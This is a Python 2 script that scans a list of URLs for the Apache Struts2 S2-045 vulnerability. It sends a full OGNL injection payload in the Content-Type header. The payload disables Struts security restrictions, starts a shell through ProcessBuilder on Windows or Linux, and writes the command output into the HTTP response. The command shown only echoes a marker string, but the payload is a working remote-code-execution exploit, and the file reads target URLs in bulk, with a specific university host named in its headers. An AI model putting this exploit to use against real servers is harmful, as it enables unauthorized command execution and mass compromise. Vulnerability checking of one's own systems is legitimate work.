#! /usr/bin/env python
# encoding:utf-8
import urllib2
import sys
import loggerCheck
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers

header1 ={
"Host":"alumnus.shu.edu.cn",
"Connection":"keep-alive",
"Refer":"alumnus.shu.edu.cn",
"Accept":"*/*",
"X-Requested-With":"XMLHttpRequest",
"Accept-Encoding":"deflate",
"Accept-Language":"zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4",
}

def checkPoc(url):
    register_openers()
    datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]='''%{(#nike='multipart/form-data').
    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
    (#_memberAccess?(#_memberAccess=#dm):
    ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
    (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).
    (#context.setMemberAccess(#dm)))).(#cmd='echo s2-045-s2-045').
    (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
    (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
    (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
    (#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().
    getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
    (#ros.flush())}'''
    request = urllib2.Request(url,datagen,headers=header)
    response = urllib2.urlopen(request,timeout=3)
    page = response.read()
    response.close()
    if 's2-045-s2-045' in page:
        loggerCheck.log.info('VULNERABLE--'+url)
        return 1
    else:
        loggerCheck.log.debug('NOT VULNERABLE--'+url)
        return 0
def check(path):
    urls = open(path)
    for line in urls:
        try:
            checkPoc(line)
        except Exception as e:
            loggerCheck.log.warning(line+str(e)+'\n')
    urls.close()

if __name__ == '__main__':
    if len(sys.argv) == 2:
        check(sys.argv[1])
        
    else:
        while 1:
            try:
                path = raw_input('Input urlFile Path >>')
                if path=='q':
                    sys.exit();
                else:
                    loggerCheck.log.info("url File Path: "+path)
                    check(path) 
            except Exception as e:
                 print("main warning:"+str(e))


